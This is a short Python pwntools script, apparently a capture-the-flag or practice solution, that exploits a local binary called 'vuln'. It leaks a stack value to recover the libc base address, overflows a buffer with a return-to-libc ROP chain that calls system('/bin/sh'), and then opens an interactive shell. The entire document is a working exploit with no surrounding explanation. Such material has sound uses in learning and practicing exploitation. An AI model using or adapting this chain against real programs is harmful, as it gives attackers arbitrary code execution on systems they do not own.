#!/usr/bin/env python3

from pwn import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

pop_rdi_offset = 0x23a5f # found with ROPgadget
libc_start_main_offset = libc.symbols[b"__libc_start_main"]
system_offset = libc.symbols[b"system"]
exit_offset = libc.symbols[b"exit"]
bin_sh_str_offset = next(libc.search(b"/bin/sh"))

p = process("./vuln")
#p = remote("localhost", 31337)

p.recvuntil("name?\n")
p.sendline(b"A"*8 + b"B"*8)

p.recvuntil("Hello " + 'A'*8 + "B"*8)
leak_str = p.recvuntil("!")[-9:-1]

leak = u64(leak_str + b"\x00"*(8 - len(leak_str)))
print("leak: " + hex(leak))

libc_base = leak - 235 - libc_start_main_offset # 235 is the offset of leak
print("libc base: " + hex(libc_base))

system = libc_base + system_offset
exit = libc_base + exit_offset
pop_rdi = libc_base + pop_rdi_offset
bin_sh_str = libc_base + bin_sh_str_offset

payload = p64(pop_rdi)
payload += p64(bin_sh_str)
payload += p64(system)
payload += p64(exit)

p.recvuntil("from?\n")

p.sendline(b"A"*8 + b"B"*8 + b"C"*8 + payload)
p.recvuntil("Cool!\n")

p.interactive()
